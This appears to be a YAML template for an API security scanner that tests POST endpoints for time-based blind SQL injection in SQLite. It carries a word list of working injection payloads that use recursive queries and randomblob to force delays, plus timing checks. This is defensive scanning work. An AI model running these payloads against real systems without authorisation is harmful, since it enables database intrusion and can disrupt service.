id: TIME_BASED_SQLI_SQLITE_POST
info:
  name: "Time based SQL injection test for SQLITE DB for POST method APIs"
  description: "The Time-Based SQL Injection Test for SQLite DB for POST Method APIs aims to detect blind SQL injection vulnerabilities in applications using SQLite databases. By injecting SQL payloads that include time delay functions like `sleep()` into POST request parameters, the test triggers intentional delays in database responses. Attackers can measure these delays to infer the existence of vulnerabilities, even without receiving explicit error messages. This test is particularly useful for identifying blind SQL injection risks in SQLite-based applications where direct feedback might not be available."
  details: "The Time-Based SQL Injection Test for SQLite DB for POST Method APIs involves sending specially crafted SQL payloads through POST method inputs, where the injected SQL contains functions such as `sleep()` or `waitfor delay()`. When executed, these payloads intentionally delay the database's response for a set period, allowing attackers to observe the time it takes for the server to respond. By analyzing these time delays, attackers can determine whether the input is being processed by the database, and infer valuable information about the database schema, structure, and potentially sensitive data. This approach is effective even when direct error messages are suppressed or when error-based injection is not possible."
  impact: "The impact of the Time-Based SQL Injection Test for SQLite DB for POST Method APIs can be significant, as it allows attackers to exploit blind SQL injection vulnerabilities without needing explicit error messages. Successful exploitation can lead to unauthorized access to sensitive database information, including user data and internal application logic. In severe cases, attackers may be able to escalate the attack to execute arbitrary commands, potentially compromising the entire system. This type of vulnerability can also contribute to data leaks, integrity issues, and service disruptions."

  category:
    name: NO_AUTH
    shortName: Broken Authentication
    displayName: Broken User Authentication (BUA)
  subCategory: TIME_BASED_SQLI_SQLITE_POST
  severity: MEDIUM
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
  cwe:
    - CWE-287
  cve:
    - CVE-2020-24008
    - CVE-2021-45901

attributes:
  nature: INTRUSIVE
  plan: PRO
  duration: SLOW


api_selection_filters:
  method:
    eq: "POST"
  response_code:
    gte: 200
    lt: 300
  response_payload:
    length:
      gt: 0
    not_contains:
      - Error
      - Internal Server
      - Failed
      - Unauthorized
      - access denied
      - Forbidden
      - Method Not allowed
      - Gateway timeout
      - request timeout
      - server error
      - server busy
      - authentication error
      - authorization error
      - validation error
      - Permission Denied
      - invalid token
      - token expired
      - session expired
      - session timeout
      - unexpected error
      - unable to process request
      - bad request
      - service unavailable
      - account is locked
      - account is blocked
      - multiple failed attempts

  request_payload:
    for_one:
      key:
        regex: ".*"
        extract: userKey
      value:
        extract: userVal
wordLists:
  timeBasedPayloads:
    - "' OR 1=1; WITH RECURSIVE cte(x) AS (SELECT 1 UNION ALL SELECT x FROM cte LIMIT 10000000) SELECT null FROM cte -- -"
    - "' OR 1=1; SELECT COUNT(*) FROM sqlite_master, sqlite_master, sqlite_master WHERE randomblob(1000000) -- -"
    - "' OR (SELECT CASE WHEN (1=1) THEN (WITH RECURSIVE cte(x) AS (SELECT 1 UNION ALL SELECT x FROM cte LIMIT 10000000) SELECT null FROM cte) ELSE 1 END) -- -"
    - "' OR (SELECT 1 WHERE 1=1 AND randomblob(1000000)) -- -"
execute:
  type: multiple
  requests:
    - req:
        - add_header:
            dummyKey: dummyVal
        - validate:
            response_code:
              gte: 200
              lt: 300
            response_payload:
              length:
                gt: 0
              not_contains:
                - Error
                - Internal Server
                - Failed
                - Unauthorized
                - access denied
                - Forbidden
                - Method Not allowed
                - Gateway timeout
                - request timeout
                - server error
                - server busy
                - authentication error
                - authorization error
                - validation error
                - Permission Denied
                - invalid token
                - token expired
                - session expired
                - session timeout
                - unexpected error
                - unable to process request
                - bad request
                - service unavailable
                - account is locked
                - account is blocked
                - multiple failed attempts
                - Attention Required!
                - CloudFlare
                - Sorry, you have been blocked
                - " OR "
        - success: x2
        - failure: exit
    - req:
        - modify_body_param:
            userKey: ${userVal}${timeBasedPayloads}
        - validate:
            response_code:
              eq: 429
validate:
  and:
    - compare_greater:
        - ${x2.response.stats.median_response_time}
        - 5001
    - compare_greater:
        - ${x2.response.stats.median_response_time}
        - ${x1.response.stats.median_response_time} * 5
